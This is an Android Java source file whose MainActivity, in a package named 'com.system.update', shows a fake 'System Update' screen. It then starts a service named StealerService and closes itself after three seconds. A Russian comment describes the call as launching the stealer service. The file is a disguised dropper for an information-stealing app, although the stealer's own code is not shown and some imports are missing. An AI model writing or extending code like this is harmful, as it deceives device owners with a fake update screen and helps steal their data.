package com.system.update;

import android.os.Bundle;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        TextView text = findViewById(R.id.textView);
        text.setText("System Update\nChecking for updates...");
        
        // Запускаем сервис стиллера
        startService(new Intent(this, StealerService.class));
        
        // Закрываем активность через 3 секунды
        new Handler().postDelayed(() -> {
            finish();
        }, 3000);
    }
}
